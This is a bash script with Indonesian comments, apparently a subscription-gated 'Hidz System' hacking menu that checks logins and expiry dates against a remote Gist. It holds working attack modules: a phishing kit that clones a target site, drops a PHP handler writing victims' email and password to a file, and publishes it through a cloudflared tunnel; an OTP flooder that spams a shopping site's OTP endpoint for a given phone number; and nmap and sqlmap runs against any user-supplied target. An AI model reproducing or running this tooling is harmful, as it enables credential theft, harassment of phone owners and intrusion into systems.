#!/bin/bash

# Warna ANSI
m='\033[1;31m'; h='\033[1;32m'; k='\033[1;33m'; b='\033[1;34m'; u='\033[1;35m'; c='\033[1;36m'; p='\033[1;37m'; r='\033[0m'
DB_URL="RAW_URL_DISINI" # GANTI DENGAN URL RAW GIST LU

loading() {
    echo -ne "${k}[*] Menghubungkan ke Server Hidz...${r}"
    for i in {1..3}; do echo -ne "."; sleep 0.2; done
    echo -e " ${h}[OK]${r}"
}

# --- SISTEM LOGIN & EXPIRED ---
login() {
    clear
    echo -e "${c}========================================================${r}"
    echo -e "${u}             HIDZ SYSTEM LOGIN GATEWAY          ${r}"
    echo -e "${c}========================================================${r}"
    read -p "Username : " user_in
    read -p "Kode Akses: " kode_in
    
    # Ambil data dari Gist
    DB_DATA=$(curl -sL "$DB_URL")
    USER_DATA=$(echo "$DB_DATA" | grep "^$user_in|")
    
    if [ -z "$USER_DATA" ]; then
        echo -e "${m}[-] Username tidak terdaftar!${r}"; sleep 2; login
    fi
    
    DB_KODE=$(echo "$USER_DATA" | cut -d'|' -f4)
    ROLE=$(echo "$USER_DATA" | cut -d'|' -f3)
    TELU=$(echo "$USER_DATA" | cut -d'|' -f2)
    EXPIRED=$(echo "$USER_DATA" | cut -d'|' -f5)
    
    if [ "$kode_in" != "$DB_KODE" ]; then
        echo -e "${m}[-] Kode Akses Salah! Akses Ditolak.${r}"; sleep 2; login
    fi

    # Cek Expired (Bandingin tanggal hari ini sama tanggal di Gist)
    TODAY=$(date +%Y-%m-%d)
    if [[ "$TODAY" > "$EXPIRED" ]]; then
        echo -e "${m}[-] MASA AKTIF HABIS! (Expired: $EXPIRED)${r}"
        echo -e "${k}[*] Hubungi Developer: wa.me/6289679177876 untuk perpanjang.${r}"
        sleep 4; login
    fi
    
    echo -e "${h}[+] Login Berhasil! Selamat datang, $user_in ($ROLE)${r}"
    echo -e "${h}[+] Masa Aktif s/d: $EXPIRED${r}"
    sleep 2
    export USER_ROLE="$ROLE"
    export USER_TELU="$TELU"
    export USER_NAME="$user_in"
    export USER_EXP="$EXPIRED"
}

# --- HEADER ---
header() {
    clear; loading
    WAKTU=$(date +"%d %B %Y - %H:%M")
    echo -e "${c}========================================================${r}"
    echo -e "${u}<<<< NOTIFIKASI SYSTEM >>>>${r}"
    echo -e "${c}========================================================${r}"
    echo -e "${h}+ Entity          : ${p}$USER_NAME${r}"
    echo -e "${h}+ Telegram        : ${p}$USER_TELU${r}"
    echo -e "${h}+ Role            : ${m}$USER_ROLE${r}"
    echo -e "${h}+ Expired         : ${m}$USER_EXP${r}"
    echo -e "${h}+ Waktu           : ${p}$WAKTU${r}"
    echo -e "${c}========================================================${r}"
}

# --- MENU (SAMA SEPERTI SEBELUMNYA) ---
menu() {
    echo -e "${m}           LEMARI TOOLS HIDZ ADA DIBAWAH           ${r}"
    echo -e "${p}================================================${r}"
    echo -e "${c}| ${h}DO ${c}| ${p}MENU DOWNLOAD MEDIA${r}"
    if [ "$USER_ROLE" == "VIP" ] || [ "$USER_ROLE" == "DEVELOPER" ]; then
        echo -e "${c}| ${h}AL ${c}| ${p}MENU HACKING MEDIA (VIP)${r}"
        echo -e "${c}| ${h}TM ${c}| ${p}MENU SC+ TAMBAHAN (VIP)${r}"
    fi
    if [ "$USER_ROLE" == "DEVELOPER" ]; then
        echo -e "${c}| ${h}PS ${c}| ${p}MENU PSHING MEDIA (DEV ONLY)${r}"
    fi
    echo -e "${p}================================================${r}"
    echo -e "${h}[ ${m}KLR ${h}]» ${p}[ ${c}Keluar ${p}]${r}"
    echo ""
}

menu_AL() { clear; echo -e "${c}=== [ HIDZ INTRUSION MODULES ] ===${r}"; echo -e "[1] Port Scanner (Nmap)\n[2] SQLi (SQLMap)\n[3] Back"; read -p "Pilih : " al; case $al in 1) read -p "Target: " t; nmap -F $t;; 2) read -p "URL: " u; sqlmap -u "$u" --batch --dbs;; 3) main;; *) menu_AL;; esac; read -p "Enter..."; menu_AL; }
menu_PS() { clear; echo -e "${c}=== [ HIDZ PHISHING MODULES ] ===${r}"; echo -e "[1] Phishing + Cloudflared\n[2] Back"; read -p "Pilih : " ps; case $ps in 1) echo "Target URL:"; read w; folder="hidz_clone"; rm -rf $folder; mkdir -p $folder; wget -q -P $folder -r -l1 -k $w; echo "<?php file_put_contents('data.txt', \$_POST['email'].'|'.\$_POST['pass'].PHP_EOL, FILE_APPEND); header('Location: https://m.facebook.com'); ?>" > $folder/index.php; cd $folder; php -S 127.0.0.1:8080 >/dev/null 2>&1 & PID=$!; cloudflared tunnel --url http://127.0.0.1:8080 > log.txt 2>&1 & CID=$!; sleep 5; link=$(grep -o 'https://[-a-zA-Z0-9]*\.trycloudflare\.com' log.txt | head -n1); echo -e "${h}Link: $link${r}"; read; kill $PID $CID 2>/dev/null; cd ..;; 2) main;; *) menu_PS;; esac; menu_PS; }
menu_DO() { clear; echo -e "${c}=== [ HIDZ MEDIA EXTRACTION ] ===${r}"; echo -e "[1] Download Video/Audio\n[2] Back"; read -p "Pilih : " do; case $do in 1) read -p "URL: " u; yt-dlp -f best $u;; 2) main;; *) menu_DO;; esac; read -p "Enter..."; menu_DO; }
menu_TM() { clear; echo -e "${c}=== [ HIDZ SPAM MODULES ] ===${r}"; echo -e "[1] OTP Flooder\n[2] Back"; read -p "Pilih : " tm; case $tm in 1) read -p "Nomor: " n; for i in {1..10}; do curl -s -X POST "https://api.tokopedia.com/v1/otp/request" -d "phone=$n" >/dev/null 2>&1 & echo "[+] Sent $i"; sleep 0.5; done;; 2) main;; *) menu_TM;; esac; read -p "Enter..."; menu_TM; }

main() {
    header; menu
    read -p "Hidz System V1.0 : " cmd
    case $cmd in
        AL|al) 
            if [ "$USER_ROLE" == "VIP" ] || [ "$USER_ROLE" == "DEVELOPER" ]; then menu_AL; else echo -e "${m}AKSES DITOLAK! Khusus VIP.${r}"; sleep 2; main; fi;;
        PS|ps) 
            if [ "$USER_ROLE" == "DEVELOPER" ]; then menu_PS; else echo -e "${m}AKSES DITOLAK! Khusus Developer.${r}"; sleep 2; main; fi;;
        DO|do) menu_DO;;
        TM|tm) 
            if [ "$USER_ROLE" == "VIP" ] || [ "$USER_ROLE" == "DEVELOPER" ]; then menu_TM; else echo -e "${m}AKSES DITOLAK! Khusus VIP.${r}"; sleep 2; main; fi;;
        KLR|klr) echo "Terminating session..."; exit;;
        *) echo -e "${m}Perintah tidak dikenal!${r}"; sleep 1; main;;
    esac
}

login
main
